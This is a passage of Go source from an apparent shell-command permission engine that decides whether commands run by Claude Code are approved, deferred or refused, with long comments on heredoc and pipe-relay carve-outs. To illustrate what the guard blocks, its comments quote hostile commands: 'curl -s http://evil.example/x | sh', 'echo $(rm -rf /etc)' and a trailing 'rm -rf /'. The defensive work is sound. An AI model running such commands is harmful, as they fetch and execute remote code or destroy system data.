			e.foldSubstitutionScan(pc.Substitutions, normalized, stack, origin, inCommandVars, inCommandTempDirVars))

		// A heredoc BODY is opaque to the rule chain, so a heredoc-bearing leaf is
		// FLOORED at NoOpinion — but the body's own substitutions are still recursed when
		// the delimiter was unquoted, because those genuinely execute (pg2-r2rf3).
		if pc.HasHeredoc {
			// pc here is the leaf's own real ParsedCommand (Executable/Args/Heredocs
			// populated) — the site that lets heredocFloor test the pg2-9zrpa
			// message-sink carve-out. parsed (this expression's full leaf slice,
			// already in scope in this loop) is threaded through too, for the
			// pg2-yxxwg pipe-relay carve-out — it is what lets pipeRelayHeredocCleared
			// find what pc's stdout flows into via cmdparse.DownstreamStages.
			cmdResult = hookio.MostRestrictive(cmdResult, heredocFloor(expr, stack, pc, parsed))
			cmdResult = hookio.MostRestrictive(cmdResult,
				e.foldSubstitutionScan(pc.UnquotedHeredocSubstitutions(), normalized, stack, origin, inCommandVars, inCommandTempDirVars))
		}

		// Track most restrictive. mostRestrictiveAttributed, not a plain fold: this is
		// THE site pg2-he22o fixes. mostRestrictive starts at the Approve+"engine" seed
		// (line ~340) and stays "current" across every leaf, so on an ordinary
		// Approve/Approve tie a plain hookio.MostRestrictive fold keeps the seed's
		// engine attribution and discards cmdResult's rule attribution — meaning an
		// Approve on a Bash compound was ALWAYS credited to "engine", never to the rule
		// that actually approved it. mostRestrictiveAttributed breaks that tie in favor
		// of cmdResult's rule Module when it has one, and defers to
		// hookio.MostRestrictive unchanged for every other case (including any tie NOT
		// at Approve), so no verdict can move — only who gets credited for an Approve
		// that was already there.
		mostRestrictive = mostRestrictiveAttributed(mostRestrictive, cmdResult)

		// After processing the leaf, advance the running cwd if it is a simple
		// `cd <dir>` with exactly one non-flag argument, so subsequent leaves
		// resolve relative paths against the cd target (pg2-opclh). Conservative:
		// `cd` with zero/multiple args, `cd -`, or `cd ~...` leave the running
		// cwd unchanged (worst case a relative path stays classified as today).
		//
		// `pushd <dir>` changes the working directory exactly as `cd <dir>` does, and
		// omitting it made primary-commit judge `pushd /abs/worktree && git commit`
		// against the SESSION cwd and hard-deny a legitimate worktree commit
		// (pg2-h2npt). It CANNOT widen anything: no rule approves a `pushd` or `popd`
		// leaf, so any expression containing one is already floored at NoOpinion by
		// that leaf and the re-root can only correct a false DENY. That floor is also
		// why `popd` needs no model — a directory stack would only matter if the
		// expression could reach Approve, and it cannot.
		//
		// A target that CANNOT be expanded statically (`cd $WT`) is joined VERBATIM
		// here rather than skipped, and that is deliberate and load-bearing: the
		// unexpanded token survives into the leaf's CWD, which is the only thing that
		// lets a downstream rule DETECT that the directory is unknown instead of
		// confidently resolving the session cwd. primary-commit depends on it — see
		// internal/rules/primarycommit/dirresolve.go's DIRECTORY RESOLUTION comment —
		// so this branch MUST NOT be "fixed" to drop such targets.
		//
		// A target the COMMAND ITSELF writes down (`WT=/abs && cd "$WT"`) is a
		// different case and IS expanded, from the in-command environment above
		// (pg2-wq3ki). It has to happen HERE rather than in a rule: the verbatim join
		// is what loses the value's ABSOLUTENESS, so once `$WT` has been joined onto
		// the running cwd no consumer can recover the directory the shell will really
		// be in. Expansion is all-or-nothing (cmdparse.ExpandInCommand), so a target
		// this environment cannot resolve falls through to the verbatim join unchanged
		// and every existing verdict for it stands.
		if basePE != nil && (pc.Executable == "cd" || pc.Executable == "pushd") && len(pc.Args) == 1 &&
			!strings.HasPrefix(pc.Args[0], "-") && !strings.HasPrefix(pc.Args[0], "~") {
			dir := pc.Args[0]
			if expanded, ok := cmdparse.ExpandInCommand(dir, inCommandVars); ok {
				dir = expanded
			}
			var newCWD string
			if filepath.IsAbs(dir) {
				newCWD = filepath.Clean(dir)
			} else {
				newCWD = filepath.Clean(filepath.Join(currentCWD, dir))
			}
			currentCWD = newCWD
			currentPathEval = basePE.WithCWD(newCWD)
		}
	}

	// Floor for an expression that is NOTHING BUT env assignments no rule owns
	// (pg2-mtnmb): it executes nothing and nobody judged it, so ceta has no verdict —
	// NoOpinion, exactly as it did when Parse dropped these segments and the expression
	// reached zero leaves above. Without this, `A=1` alone would newly auto-approve,
	// and — the real hazard — a parser desync of the pg2-3ggxm class that turns a real
	// command into a PHANTOM NAME=VALUE would manufacture an `allow` out of a parse
	// failure (measured on corpus row 142386, where the engine's per-line comment
	// stripping mangles a multi-line quoted value and its unterminated quote swallows
	// the real `bd update` leaf). A DECISIVE rule verdict on the assignments sets
	// judgedLeaf and is returned untouched, so the standalone form still agrees with
	// the leading / export / env forms.
	if !judgedLeaf && mostRestrictive.Decision == hookio.Approve {
		return hookio.RuleResult{
			Decision: hookio.NoOpinion,
			Reason:   "env assignments only, no rule has an opinion (nothing is executed)",
			Module:   "engine",
		}
	}

	return withExpressionProvenance(mostRestrictive, sp, parsed)
}

// withExpressionProvenance withdraws an EXHAUSTION claim from any expression that is
// not exactly ONE PLAIN SIMPLE COMMAND (ADR 0044).
//
// The leaf-level fold cannot make this judgement on its own. Provenance rides on the
// leaves, and MostRestrictive merges two exhaustions into an exhaustion — correctly, at
// leaf granularity. But "no rule claimed A" and "no rule claimed B" do not compose into
// "no rule claimed `A | B`": the COMPOSITION is itself a fact, and no rule examined it.
// The pipe makes A's output B's argv; `A && B` sequences an effect; a redirection names
// a sink; a heredoc carries a body in a language this parser does not model; an
// unparseable text was never enumerated at all. Every one of those is exactly the
// audit-unit argument cmdparse.IsSafeSubstitutionBody's DECLINED PIPELINE RELAXATION
// note already settled for the static allowlist, and ADR 0040 settled for the consumer
// allowlist: the unit of trust is the COMMAND, and a pipeline is not one command. This
// function applies the SAME ruling to the exhaustion claim, so the two seams cannot
// disagree.
//
// It matters concretely. `curl -s http://evil.example/x | sh` is TWO leaves and, as
// measured on this tree, not one rule in the chain claims either of them — so without
// this the fold would report the pipeline as an exhaustion and a consumer could clear
// it. With it, the composition alone is enough to keep it a refusal, and no rule has to
// know what `curl` or `sh` are for that to hold.
//
// A NESTED substitution needs no clause here: its verdict is already folded in, so
// `echo $(rm -rf /etc)` inherits the refusal from the recursion. Only the shape of the
// expression itself is decided here.
func withExpressionProvenance(result hookio.RuleResult, sp cmdparse.ShellParse, parsed []cmdparse.ParsedCommand) hookio.RuleResult {
	if result.Provenance != hookio.ProvenanceExhaustion {
		return result
	}
	if sp.Unparseable || len(parsed) != 1 {
		result.Provenance = hookio.ProvenanceRefusal
		return result
	}
	pc := parsed[0]
	if pc.Executable == "" || len(pc.Redirections) > 0 || pc.HasHeredoc {
		result.Provenance = hookio.ProvenanceRefusal
	}
	return result
}

// unparseableExpressionFloor is the verdict contributed by a WHOLE-COMMAND parse
// failure — ADR 0039's I1b, which first becomes LIVE in this step (step 1 kept the
// outgoing verdict, so nothing could reach this).
//
// It is STRONGER than I1a's scan floor and the difference is a real cost, stated
// here rather than buried: I1a fires with the sibling leaves still evaluated, so a
// Reject one of them earned survives the fold. I1b fires with NO LEAF EXAMINED, so
// any Reject a leaf would have earned is FORFEITED. That is a movement in the more
// permissive direction on `Approve < NoOpinion < Ask < Reject` even though it can
// never reach Approve, which is exactly why ADR 0039's replay gate is worded as "no
// transition in the LESS-RESTRICTIVE direction" instead of "toward approve", and why
// every unparseable row is reported INDIVIDUALLY as a forfeiture.
//
// I10: the reason names the DIALECT only when the parser itself attributed the
// failure to one (a syntax.LangError). Where it did not, the reason reports the
// failure WITHOUT guessing at a cause — CETA receives no shell field in its hook
// input and can never establish which dialect will run, so a guess would be
// fabricated provenance on a user-facing prompt.
//
// It is FOLDED by the caller through MostRestrictive, never returned early, so the
// verdict stays order-independent.
func unparseableExpressionFloor(sp cmdparse.ShellParse) hookio.RuleResult {
	reason := "unparseable command (" + sp.Reason + "): no leaf could be evaluated (deferred to claude-code)"
	if sp.Dialect != "" {
		reason = "unparseable command (" + sp.Reason + "; the construct is valid in " + sp.Dialect +
			"): no leaf could be evaluated (deferred to claude-code)"
	}
	return hookio.RuleResult{Decision: hookio.NoOpinion, Reason: reason, Module: "engine"}
}

// heredocFloor is the verdict contributed by a heredoc- or herestring-bearing leaf.
//
// A heredoc body is DATA whose meaning depends on the reader: `cat <<EOF` merely
// echoes it, but `sh <<EOF` / `python <<EOF` EXECUTES it as a program in a language
// this parser does not model. ceta therefore has no verdict on such a leaf and defers
// to Claude Code's own prompt — the same conservative floor the pre-pg2-r2rf3 engine
// applied.
//
// What changed is HOW it is applied. It used to be an early `return NoOpinion` from
// EvaluateExpression, which fired on the FIRST heredoc leaf and THREW AWAY whatever
// decision an earlier leaf had already earned:
//
//	grep .git/config x && cat <<EOF   ->  NoOpinion  (gitdir's Ask discarded)
//	cat <<EOF && grep .git/config x   ->  NoOpinion
//
// Same two operations, and the verdict depended on which side of the `&&` the heredoc
// sat on — worse, a real Reject could be silently dropped, the "guard quietly stopped
// applying" class. Folding it through hookio.MostRestrictive instead makes the result
// ORDER-INDEPENDENT (max over a total order) and keeps every sibling leaf's decision:
// both spellings above now Ask. Because NoOpinion outranks Approve, the floor still
// guarantees a heredoc-bearing expression can never be green-lit BY ITSELF — see the
// one narrow exception below, which moves a body to Approve only by DEFERRING to a
// clearance and a recursive verdict that already exist elsewhere, never by widening
// what the floor itself admits.
//
// # pg2-u65fu — THE NARROWING
//
// heredocFloor takes expr/stack now, and is UNCONDITIONAL for every caller except one:
// a leaf that is itself the WHOLE of a command-substitution BODY currently being
// recursed by foldSubstitutionScan (identified by recursedSubstitutionHeredocCleared,
// which checks the TOP of stack for the {RuleName:"engine", Command:"substitution"}
// frame only foldSubstitutionScan pushes) AND whose text cmdparse.ClassifySubstitutionBody
// already admits (pg2-phtl3's static clearance: quoted delimiter, an allowlisted
// non-interpreter reader, no write flag, no unresolved argv/redirect path —
// cmdparse.heredocClearedForSubstitution).
//
// WHY THAT PAIR AND NOTHING LESS. The identical body used as an env-assignment VALUE
// (`PAYLOAD=$(cat <<'EOF' ... EOF)`) already reaches Approve today — classifyExpansion
// classifies it ExpansionSafeCmd and envvars' fast path skips recursion entirely once
// cmdparse clears it (internal/rules/envvars). The SAME body used as a command
// ARGUMENT (`echo "$(cat <<'EOF' ... EOF)"`) goes through full-engine recursion
// instead (pg2-whumr's "both gates" design for command position), and this floor —
// applied to the recursed leaf exactly as it is applied to a top-level one — was the
// one thing stopping that recursion from ever reaching the SAME Approve, even though
// cmdparse's static gate had already cleared the body and a rule (safe-commands, for
// a bare `cat`) independently approves the leaf too. Skipping the floor for exactly
// this pairing lets the leaf's own rule-chain verdict stand instead of being
// overridden, which is the ONLY thing that changes: the floor contributes the neutral
// "nothing to add" Approve identity (the same pattern every other neutral seed in this
// file uses) rather than replacing a real verdict with one of its own.
//
// # pg2-9zrpa — THE SECOND NARROWING
//
// heredocFloor grows one more exception, structurally DIFFERENT from pg2-u65fu's
// rather than an extension of it: a heredoc that is fed directly to a MESSAGE-SINK
// PROCESS's own stdin (`bd comment <id> --stdin <<'EOF' ... EOF`), not nested inside
// a `$( )` whose result becomes an argument. `stack` is empty here — there is no
// enclosing substitution, so recursedSubstitutionHeredocCleared structurally cannot
// fire for this shape, whatever cmdparse says about the body — so this is a second,
// independent condition checked ALONGSIDE it (messageSinkStdinHeredocCleared),
// never a relaxation of pg2-u65fu's own stack check.
//
// Operator ruling, 2026-08-24 (bead pg2-9zrpa, itself discovered from pg2-mdn4g):
// implement this carve-out, scoped as narrowly as pg2-u65fu's — quoted (non-
// expanding) delimiter, an allowlisted message-sink reader, no write flag — and
// never as a blanket "message-sink command" bypass.
//
// WHY THAT TRIPLE AND NOTHING LESS.
//
//   - The delimiter must be QUOTED for the same reason pg2-u65fu's is: an unquoted
//     body's `$(...)` genuinely expands before bash ever hands the bytes to the
//     sink's stdin, so an unquoted `bd comment id --stdin <<EOF ... EOF` can still
//     smuggle a live command substitution — the sink never executing its stdin does
//     not make an expanding delimiter safe, it only means THIS floor is not the
//     guard that would catch it (foldSubstitutionScan's unquoted-body recursion is,
//     unaffected by this carve-out). Requiring Quoted keeps this exception narrow
//     even though, for `bd` specifically, the sink not executing stdin makes the
//     condition moot today — a FUTURE sink might not be so lucky, and consistency
//     with pg2-u65fu's own reasoning is cheap to keep.
//   - The reader must be on an ALLOWLIST (today, `bd` only) for the same reason
//     heredocReaderAllowlist is scoped to the corpus-measured `cat`/`/bin/cat`
//     spellings rather than generalised to every read-only tool: widening is
//     ADDITIVE IN PRINCIPLE but UNMEASURED, and this repo's convention (messageFlags'
//     own doc, argflags.go) is to scope to what the corpus actually carries and earn
//     any widening with its own replay evidence.
//   - The leaf's Args must carry the SPECIFIC flag that tells the sink to read a
//     message from stdin (today, `bd`'s `--stdin` only — NOT the bead's own
//     hypothetical `--body-file -`, which is unmeasured and therefore excluded).
//     This is what makes the carve-out about DATA CONSUMED AS A MESSAGE rather than
//     "any heredoc that happens to precede an allowlisted command": `bd comment <id>
//     <<'EOF' ... EOF` with no `--stdin` still floors, because without the flag
//     bd's own CLI does not read the heredoc as a message at all — the bytes land on
//     an fd bd never consults for that subcommand, and this floor has no way to know
//     that from argv alone without the flag as the explicit signal.
//
// Together, the allowlisted sink AND the explicit flag are what keep this narrow:
// either alone would be a materially bigger bypass — the sink name alone would
// approve a heredoc on `bd` even when it is not being read as a message at all, and
// the flag alone (checked against a sink that is not on the allowlist) would trust
// an unmeasured command's argv contract. The intersection is comparably narrow to
// pg2-u65fu's own pairing.
//
// NOT MODELLED, and stated as a known, accepted limitation rather than silently
// skipped: this codebase's cmdparse.Heredoc / hookio.Redirection types record no
// target FILE DESCRIPTOR at all (no representation of `3<<EOF` vs a plain `<<EOF`),
// so there is nothing here to check that the heredoc actually lands on fd 0 — the
// allowlisted-sink + explicit-flag pair is the whole of what this floor can verify,
// and it is what the corpus rows this bead re-verifies actually carry.
//
// WHAT DOES NOT CHANGE, and why the two conditions are each load-bearing:
//
//   - A TOP-LEVEL heredoc (`cat <<'EOF' ... EOF` typed directly — `stack` is empty,
//     there is no enclosing substitution to recurse from) never satisfies the stack
//     check, whatever cmdparse.ClassifySubstitutionBody says about the identical text.
//     TestIntegration_HeredocExtents' "cat with a heredoc is not approved" and
//     TestIntegration_GitdirMetadataAccess's "top-level heredoc body naming a path"
//     pin exactly this pairing (same reader, same quoting) at NoOpinion, unmodified.
//   - A recursed body that is NOT statically cleared — an unquoted delimiter, a
//     non-allowlisted or interpreter reader (`sh`, `python`), a write flag, or an
//     unresolved argv/redirect path — still classifies SubstitutionRefused or
//     SubstitutionDelegated, never SubstitutionCleared, so this floor still applies to
//     it exactly as before, in BOTH positions. That is pg2-wguam's RCE floor and it is
//     untouched: quoting a heredoc into `sh`/`python` still executes the body as a
//     program this parser does not model, and cmdparse's own admission test says so
//     (heredocClearedForSubstitution's doc), so those bodies never reach the one
//     condition this function relaxes.
//   - A Cleared-but-UNMODELLED reader (none exist on heredocReaderAllowlist today,
//     but the mechanism is future-proof against one being added later) still cannot
//     slip through to Approve: skipping this floor only removes ITS OWN NoOpinion
//     contribution, so the leaf's own chain verdict — an unmodelled reader's terminal
//     loop-exhaustion NoOpinion+ProvenanceExhaustion — flows through unobstructed to
//     foldSubstitutionScan's existing SubstitutionCleared/ProvenanceExhaustion branch,
//     which floors it to a decisive Ask via commandSubstitutionFloor exactly as it
//     already does for `seq`/`mktemp`. This function does not need its own copy of
//     that guard; it only has to stop MASKING the verdict that guard is built to see.
//   - A top-level heredoc into a command NOT on heredocStdinSinkFlags' key set still
//     floors — `cat --stdin <<'EOF' ... EOF` is not `bd`, so it is unaffected by this
//     carve-out (and `cat` taking a literal `--stdin` argument is itself contrived;
//     the point is the sink identity, not the flag spelling).
//   - A top-level heredoc into `bd` WITHOUT `--stdin` still floors — the flag is what
//     establishes the data is actually consumed as a MESSAGE, not merely incidental
//     on the leaf's stdin; `bd comment <id> <<'EOF' ... EOF` with no `--stdin` gets no
//     help from this carve-out.
//   - An UNQUOTED heredoc into `bd --stdin` still floors, unchanged RCE reasoning:
//     quoting only suppresses expansion (bd does not execute its stdin either way,
//     so this condition is moot for `bd` today), but the condition is kept for
//     consistency with pg2-u65fu's pairing and because a future sink added to
//     heredocStdinSinkFlags might not be so lucky.
//
// # pg2-yxxwg — THE THIRD NARROWING
//
// heredocFloor grows a third exception, structurally DIFFERENT again from both of
// the above rather than an extension of either: a heredoc-bearing leaf whose
// stdout is PIPED INTO a separate leaf that is itself an allowlisted message-sink
// consuming its own `--stdin` — `cat <<'EOF' ... EOF | bd comment <id> --stdin`,
// as opposed to pg2-9zrpa's shape where the heredoc lands DIRECTLY on the sink's
// own leaf (`bd comment <id> --stdin <<'EOF' ... EOF`, no pipe at all).
//
// Operator ruling, 2026-08-24 (bead pg2-yxxwg, discovered from pg2-9zrpa's own
// corpus verification): pg2-9zrpa's carve-out was written and measured against
// the corpus rows the bead's own text named, but those rows turned out to
// predominantly be this PIPE-RELAY shape rather than the direct shape pg2-9zrpa
// actually covers — `heredocFloor` is called for the `cat` leaf (which carries
// the heredoc), `messageSinkStdinHeredocCleared` checks THAT leaf's own
// Executable/Args against heredocStdinSinkFlags, the leaf is `cat` and not `bd`,
// the check fails, and the whole expression floors to NoOpinion even though
// `bd`'s leaf right after the pipe DOES carry `--stdin`. The operator approved
// COMPOSING pg2-phtl3's reader-identity carve-out with pg2-9zrpa's sink-identity
// carve-out across the pipe boundary, gated on the same conjunctive narrowness
// both individual carve-outs already apply — never as a general "an allowlisted
// reader piped into an allowlisted sink" relaxation.
//
// FIVE CONDITIONS, ALL REQUIRED (the operator ruling's own enumeration; see
// pipeRelayHeredocCleared's doc for exactly which function checks which):
//
//  1. Heredoc delimiter QUOTED on the heredoc-bearing leaf — every extent, same
//     "all must be quoted" rule as both existing carve-outs.
//  2. The heredoc-bearing leaf's own executable is on heredocReaderAllowlist
//     (today `cat`/`/bin/cat` only — NOT widened here; that widening was
//     explicitly declined and is its own bead if ever wanted).
//  3. The pipe TARGET — what the heredoc-bearing leaf's stdout flows into,
//     found via cmdparse.DownstreamStages — is an allowlisted message-sink
//     (today `bd` only, via the existing heredocStdinSinkFlags map).
//  4. The content lands on the sink leaf's `--stdin` flag
//     (cmdparse.HasAnyFlag against heredocStdinSinkFlags[sink.Executable]).
//  5. No write flag on EITHER leaf — the sink screen mirrors
//     messageSinkStdinHeredocCleared's own cmdparse.MutatingFlags check exactly
//     (pipeRelaySinkCleared); the READER leaf gets the identical screen via
//     cmdparse.HeredocReaderCleared, for the same reason
//     messageSinkStdinHeredocCleared screens the sink even though `bd` carries no
//     mutating flag today — consistency with a future addition, not a live
//     restriction.
//
// A SIXTH CONDITION THE RULING DOES NOT ENUMERATE, BUT WHICH IS LOAD-BEARING AND
// NOT OPTIONAL: the reader leaf's OWN argv and redirections must independently
// clear the same static screen ClassifySubstitutionBody already applies to an
// identical reader shape (cmdparse.HeredocReaderCleared's conditions 3-4; see its
// own doc for the empirically-verified reason — a positional file operand on the
// SAME leaf as the heredoc makes `cat` emit that FILE's bytes instead of the
// heredoc body, an arbitrary-file-exfiltration route through `bd`'s `--stdin`
// that the ruling's five conditions alone do not exclude, because the ruling was
// written against the SINK's argv, not the READER's). Composing two narrow
// carve-outs must not produce something LESS safe than either carve-out is on
// its own, and pg2-phtl3's own carve-out (via ClassifySubstitutionBody) already
// requires exactly this for the identical reader shape — omitting it here would
// be a regression relative to that precedent, not a faithful composition of it.
//
// REFUSED, AND DELIBERATELY, WHEN THE PIPE TOPOLOGY IS ANYTHING OTHER THAN A
// STRICT TWO-STAGE READER-TO-SINK RELAY: pipeRelayHeredocCleared requires
// cmdparse.DownstreamStages to report EXACTLY ONE downstream leaf. Zero means no
// pipe at all — a top-level `cat --stdin <<'EOF' ... EOF` with no `|` anywhere,
// which must keep flooring exactly as TestIntegration_HeredocStdinMessageSinkCarveOut
// already pins (`cat` is a reader, not a sink, and there is no pipe target to
// even ask the sink question of). More than one means either a THIRD stage after
// the sink (`cat <<'EOF' ... EOF | bd comment 1 --stdin | othercmd`) or a fan-out
// — DownstreamStages returns every leaf whose PipelineIndex exceeds the reader's
// within the same pipeline, transitively, so a third stage always shows up
// alongside the sink and trips this refusal; this floor does not attempt to
// reason about what a third stage might do with bd's own stdout.
//
// NOT MODELLED, same limitation as pg2-9zrpa's own carve-out and for the same
// reason: no target file descriptor is recorded for either the heredoc or the
// pipe, so there is nothing here to check that the heredoc genuinely lands on the
// reader's fd 0 or that the pipe genuinely lands on the sink's fd 0 beyond what
// ordinary shell-pipe semantics already guarantee.
func heredocFloor(expr string, stack []hookio.StackFrame, pc cmdparse.ParsedCommand, leaves []cmdparse.ParsedCommand) hookio.RuleResult {
	if recursedSubstitutionHeredocCleared(expr, stack) {
		return hookio.RuleResult{
			Decision: hookio.Approve,
			Reason:   "heredoc body is a recursed command-substitution body already cleared by the static substitution allowlist (pg2-u65fu)",
			Module:   "engine",
		}
	}
	if messageSinkStdinHeredocCleared(pc) {
		return hookio.RuleResult{
			Decision: hookio.Approve,
			Reason:   "heredoc body is fed to an allowlisted message-sink command's --stdin, already cleared by the static message-sink allowlist (pg2-9zrpa)",
			Module:   "engine",
		}
	}
	if pipeRelayHeredocCleared(pc, leaves) {
		return hookio.RuleResult{
			Decision: hookio.Approve,
			Reason:   "heredoc body is relayed through an allowlisted reader into an allowlisted message-sink's --stdin, already cleared by composing the static substitution and message-sink allowlists (pg2-yxxwg)",
			Module:   "engine",
		}
	}
	return hookio.RuleResult{
		Decision: hookio.NoOpinion,
		Reason:   "heredoc body is not evaluable as a command (deferred to claude-code)",
		Module:   "engine",
	}
}

// recursedSubstitutionHeredocCleared reports whether THIS EvaluateExpression call is
// itself evaluating a command-substitution BODY — pushed by foldSubstitutionScan,
// the ONLY caller anywhere in this tree that appends a
// {RuleName:"engine", Command:"substitution"} frame — whose entire text
// cmdparse.ClassifySubstitutionBody already admits.
//
// CHECKING ONLY THE TOP OF stack IS DELIBERATE AND SUFFICIENT. Every other recursion
// boundary (docker/nix/kubectl's own inner-command recursion, envvars' env-value
// recursion) starts or appends its OWN frame under its OWN RuleName/Command pair, never
// "engine"/"substitution" — so a substitution nested inside any of them still gets a
// correctly-labelled frame pushed on top by foldSubstitutionScan at the moment IT
// recurses, at any nesting depth. There is no path by which a stale or unrelated frame
// can occupy that position and be misread as this one.
//
// expr is the WHOLE text passed to this EvaluateExpression call, which — exactly when
// this call IS a substitution-body recursion — is byte-for-byte the same sub.Body
// foldSubstitutionScan will separately classify at its own call site (see
// foldSubstitutionScan's ClassifySubstitutionBody switch). Reusing it here rather than
// a per-leaf slice is what makes a MULTI-leaf recursed body correctly refuse: cmdparse's
// soleSimpleCommandLeaf requires the WHOLE body to be one simple command, so a body
// like "cat <<'EOF' ... EOF; rm -rf /" already classifies SubstitutionRefused and this
// function reports false for every leaf inside it, not just the offending one.
func recursedSubstitutionHeredocCleared(expr string, stack []hookio.StackFrame) bool {
	if len(stack) == 0 {
		return false
	}
	top := stack[len(stack)-1]
	if top.RuleName != "engine" || top.Command != "substitution" {
		return false
	}
	return cmdparse.ClassifySubstitutionBody(expr) == cmdparse.SubstitutionCleared
}

// heredocStdinSinkFlags maps a message-sink command's basename to the flag that
// tells IT to read its message from stdin — the pg2-9zrpa counterpart to
// cmdparse's heredocReaderAllowlist (which vouches for a substitution-body READER
// identity), scoped the same way: to exactly what the corpus measured.
//
// SCOPED TO `bd`'s `--stdin` ONLY, deliberately, rather than generalised to every
// messageFlags command (argflags.go) or to the bead's own hypothetical
// `--body-file -` spelling. pg2-9zrpa's motivating corpus rows are all
// `bd comment/update/create ... --stdin <<'EOF' ... EOF`; `--body-file -` was
// floated in that bead's text as a hypothetical, never observed, and this
// repo's convention (heredocReaderAllowlist's own doc; messageFlags' "the set of
// commands is closed" doc) is to admit only a corpus-measured shape and widen
// later with its own replay evidence — never preemptively. Widening to `git`,
// `gh`, or a different flag spelling needs its own measured case, not a guess
// added here.
var heredocStdinSinkFlags = map[string]map[string]bool{
	"bd": {"--stdin": true},
}

// messageSinkStdinHeredocCleared reports whether EVERY heredoc extent on pc is
// admissible as a message-sink command's stdin payload — the pg2-9zrpa carve-out,
// checked ALONGSIDE (never instead of) recursedSubstitutionHeredocCleared in
// heredocFloor. See heredocFloor's own "pg2-9zrpa — THE SECOND NARROWING" doc for
// why this is a second, independent condition rather than a widening of the first.
//
// FOUR CONDITIONS, ALL REQUIRED — mirrors cmdparse.heredocClearedForSubstitution's
// own shape (quoted delimiter + allowlisted reader), plus the two pg2-9zrpa adds
// (the explicit stdin flag, and the pre-existing no-write-flag screen):
//
//  1. pc.HasHeredoc AND len(pc.Heredocs) > 0 — a HERESTRING (`<<<`) sets HasHeredoc
//     but records no Heredocs entry (heredoc.go's own doc), so there is no extent
//     to admit and an empty slice must refuse rather than vacuously clearing via a
//     no-op loop below (same reasoning as heredocClearedForSubstitution's doc).
//  2. EVERY heredoc in pc.Heredocs has Quoted == true. One unquoted extent anywhere
//     on the leaf refuses the WHOLE leaf — mirrors heredocClearedForSubstitution's
//     own multi-heredoc rule (`cmd <<A <<B` needs both quoted) — because an
//     unquoted body's `$(...)` really expands regardless of which redirection on
//     the leaf it sits on.
//  3. pc.Executable is a key of heredocStdinSinkFlags (today, `bd` only).
//  4. pc.Args carries the flag that map names for pc.Executable (today, `--stdin`
//     only) — via cmdparse.HasAnyFlag, so the glued `--stdin=...` spelling (not a
//     real bd spelling today, but consistent with every other flag check in this
//     tree) cannot hide from it either.
//
// PLUS the pre-existing no-write-flag screen every other clearance in this tree
// carries: cmdparse.MutatingFlags["bd"] has no entry today, so this is a no-op
// safety net rather than a live restriction — matching how yq's write-flag screen
// was added defensively before yq actually needed one (pipesink.go's own doc).
//
// NOT CHECKED, and deliberately: which file descriptor the heredoc targets.
// cmdparse.Heredoc / hookio.Redirection record no target fd at all (no
// representation of `3<<EOF` vs a plain `<<EOF`), so this function has nothing to
// test there — see heredocFloor's own "NOT MODELLED" paragraph.
func messageSinkStdinHeredocCleared(pc cmdparse.ParsedCommand) bool {
	if !pc.HasHeredoc || len(pc.Heredocs) == 0 {
		return false
	}
	for _, hd := range pc.Heredocs {
		if !hd.Quoted {
			return false
		}
	}
	sinkFlags, ok := heredocStdinSinkFlags[pc.Executable]
	if !ok {
		return false
	}
	if !cmdparse.HasAnyFlag(pc.Args, sinkFlags) {
		return false
	}
	if cmdparse.HasAnyFlag(pc.Args, cmdparse.MutatingFlags[pc.Executable]) {
		return false
	}
	return true
}

// pipeRelaySinkCleared reports whether sink — the leaf found immediately (and
// exclusively) downstream of a pg2-yxxwg pipe-relay reader — is an allowlisted
// message-sink consuming its stdin as a message: the SINK-side half of the
// pg2-yxxwg carve-out, checked by pipeRelayHeredocCleared once it has confirmed
// the reader half via cmdparse.HeredocReaderCleared.
//
// DUPLICATES three of messageSinkStdinHeredocCleared's five conditions (sink
// identity, the --stdin flag, no write flag) RATHER THAN CALLING IT, and that is
// deliberate, not an oversight: sink here is bd's OWN leaf, and in the pipe-relay
// shape bd's leaf carries NO heredoc of its own — the heredoc sits on the READER
// leaf upstream of the pipe. messageSinkStdinHeredocCleared's first two
// conditions are `!pc.HasHeredoc || len(pc.Heredocs) == 0 { return false }`, which
// would refuse sink immediately and unconditionally, so it cannot be reused as-is
// for this call site. Duplicating the remaining three conditions here — rather
// than restructuring messageSinkStdinHeredocCleared to expose them separately —
// keeps pg2-9zrpa's own approved function completely untouched, per this bead's
// explicit scope (compose alongside pg2-9zrpa's carve-out, never edit it).
//
// THREE CONDITIONS, ALL REQUIRED, identical in substance to
// messageSinkStdinHeredocCleared's conditions 3-5:
//
//  1. sink.Executable is a key of heredocStdinSinkFlags (today, `bd` only).
//  2. sink.Args carries the flag that map names for sink.Executable (today,
//     `--stdin` only), via cmdparse.HasAnyFlag — the glued `--stdin=...`
//     spelling cannot hide from it either, same as pg2-9zrpa's own check.
//  3. sink.Args carries no mutating flag (cmdparse.MutatingFlags[sink.Executable]
//     — empty for `bd` today, a no-op safety net matching pg2-9zrpa's own).
func pipeRelaySinkCleared(sink cmdparse.ParsedCommand) bool {
	sinkFlags, ok := heredocStdinSinkFlags[sink.Executable]
	if !ok {
		return false
	}
	if !cmdparse.HasAnyFlag(sink.Args, sinkFlags) {
		return false
	}
	if cmdparse.HasAnyFlag(sink.Args, cmdparse.MutatingFlags[sink.Executable]) {
		return false
	}
	return true
}

// pipeRelayHeredocCleared reports whether pc — a heredoc-bearing leaf — is
// admissible as the READER half of a pg2-yxxwg two-stage pipe relay into an
// allowlisted message-sink's `--stdin`: `cat <<'EOF' ... EOF | bd comment <id>
// --stdin`. See heredocFloor's own "pg2-yxxwg — THE THIRD NARROWING" doc for the
// full five-plus-one condition rationale; this function is where each condition
// is actually checked.
//
// leaves is the full leaf slice of the expression pc belongs to — evaluateParsed's
// own `parsed`, threaded in from both of heredocFloor's call sites exactly as
// `expr`/`stack` already are — because finding what pc's stdout flows into needs
// pc's SIBLING leaves, not just pc itself.
//
//  1. cmdparse.HeredocReaderCleared(pc) — conditions 1, 2 and 5's reader half (see
//     that function's own doc), PLUS the sixth, unenumerated condition (reader
//     argv/redirect safety) its doc explains at length.
//  2. cmdparse.DownstreamStages(leaves, pc.Raw) must return EXACTLY ONE leaf. Zero
//     means pc is not in a pipeline at all (or is the pipeline's last stage) —
//     there is no sink to even ask about, so this must refuse rather than treat
//     "no pipe" as "vacuously fine". More than one means a third stage sits
//     downstream of whatever the immediate sink is (DownstreamStages returns
//     every later stage in the pipeline, not just the next one), which this floor
//     does not attempt to reason about — see heredocFloor's own doc for why a
//     third stage is refused rather than merely ignored.
//  3. pipeRelaySinkCleared on that one downstream leaf — conditions 3, 4 and 5's
//     sink half.
func pipeRelayHeredocCleared(pc cmdparse.ParsedCommand, leaves []cmdparse.ParsedCommand) bool {
	if !cmdparse.HeredocReaderCleared(pc) {
		return false
	}
